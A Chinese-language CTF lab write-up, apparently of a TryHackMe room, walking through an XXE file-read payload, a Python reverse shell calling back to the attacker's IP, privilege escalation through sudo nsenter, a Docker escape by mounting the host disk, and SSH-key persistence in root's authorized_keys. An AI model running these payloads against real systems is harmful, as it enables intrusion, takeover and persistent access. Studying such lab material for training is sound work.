然而```admin:dQw4w9WgXcQ```不能登录

what the fuck....

这串古怪的符号和youtube上的这个视频的id居然一样：
视频是[Rick Astley - Never Gonna Give You Up (Official Music Video)](https://www.youtube.com/watch?v=dQw4w9WgXcQ)，不知道是作者在叫我不要放弃还是有什么提示。。。


爆破admin账号不成功，sql注入也没有结果。在我经验范围内，我已经用尽了所有方法，所以这个时候我只能看大佬walkthrough了： ）

原来是在burpsuite里用xml注入

payload
```
GET /api/user?xml HTTP/1.1
Host: 10.10.243.173
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Length: 148



<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY ac SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">]>
<foo><id>&ac;</id></foo>
```

返回了index.php的base64密文，解出来是：
```
<?php
include_once('../Autoload.php');
include_once('../Route.php');
include_once('../Output.php');
include_once('../View.php');

Route::load();
Route::run();
```

最后在```../controllers/Api.php```找到admin的登录凭证：niceWorkHackerm4n

登录进去后在靶机提供的webshell栏写payload:
```
python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.13.21.169",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```

收到反弹shell
```
└─# nc -lnvp 4242
listening on [any] 4242 ...
connect to [10.13.21.169] from (UNKNOWN) [10.10.243.173] 59426
$ ls
ls
bootstrap.min.css  bootstrap.min.js  index.php  jquery.min.js  script.js

```

查看```/etc/passwd```我们知道admin是系统里的期中一个用户，由于我们已经知道admin的密码，这个时候本来可以直接su admin
然而这个系统并没有su 命令，这个时候可以使用ssh来转换角色

>ssh admin@localhost sh
```
www-data@6b364d3940e6:/var/www/html/public$ ssh admin@localhost sh
ssh admin@localhost sh
admin@localhost's password: 
id
uid=1000(admin) gid=1000(admin) groups=1000(admin),27(sudo)
whoami
admin
```

这个时候不要切换成tty，用sudo -l查看admin的超级权限，发现可以用/usr/bin/nsenter
```
sudo -l
Matching Defaults entries for admin on 6b364d3940e6:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User admin may run the following commands on 6b364d3940e6:
    (ALL) ALL
    (ALL : ALL) ALL
    (ALL) NOPASSWD: /usr/bin/nsenter

```

直接提权到root
```
sudo /usr/bin/nsenter /bin/sh
id
id
uid=0(root) gid=0(root) groups=0(root)

```

去```/root/container1_flag.txt```拿flag

## 提权

用```fdisk -l```命令打印发现```/dev/xvda1```这个分区应该是主机的分区

我们把它挂载到当前docker镜像的```/mnt/compromise```下面:

```
mkdir -p /mnt/compromise
mount /dev/xvda1 /mnt/compromise
```


在```/mnt/compromise/root```  拿到 root flag


把攻击机的公钥追加到靶机的authorized_keys
```
echo "ssh-rsa *************" >> /mnt/compromise/root/.ssh/authorized_keys
```

root身份登录靶机
```
┌──(root💀kali)-[~/tryhackme/hackerhill]
└─# ssh  root@10.10.243.173 -p 22                                                                                                                                                                                                     255 ⨯
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-1037-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Oct 29 08:25:38 UTC 2021

  System load:                      0.04
  Usage of /:                       88.8% of 7.69GB
  Memory usage:                     72%
  Swap usage:                       37%
  Processes:                        205
  Users logged in:                  0
  IPv4 address for br-9c1efeb291f3: 172.18.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for eth0:            10.10.243.173

  => / is using 88.8% of 7.69GB


0 updates can be installed immediately.
0 of these updates are security updates.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

root@ip-10-10-243-173:~# cat /var/www/container2_flag.txt
cat: /var/www/container2_flag.txt: No such file or directory
root@ip-10-10-243-173:~# whoami
root
```


全局查找flag2
```
root@ip-10-10-243-173:/# find / -name container2_flag.txt
find: ‘/proc/27811’: No such file or directory
/var/lib/docker/overlay2/fb80a052499ad52a2df535ce669f4cca3b02009c751ab47752374a566ec61667/diff/var/www/container2_flag.txt
/var/lib/docker/overlay2/7149ee32cde09f7439cc3588b5f757bd6b16aaaccb59f8cf3291e8d6dc6c05db/merged/var/www/container2_flag.txt
```


全局查找flag3
```
root@ip-10-10-243-173:/# find / -name container3_flag.txt
find: ‘/proc/28025/task/28025/net’: Invalid argument
find: ‘/proc/28025/net’: Invalid argument
/var/lib/docker/overlay2/d38650b56ff4bbca92fe794176a3394bd05fc9d55d87341b1c0d2a54b5ae1c03/merged/home/container3_flag.txt
/var/lib/docker/overlay2/5bfb136d474f285a5a6133918e11acd8212b7559b33494e11e8c72fbe7e2f6c6/diff/home/container3_flag.txt
```


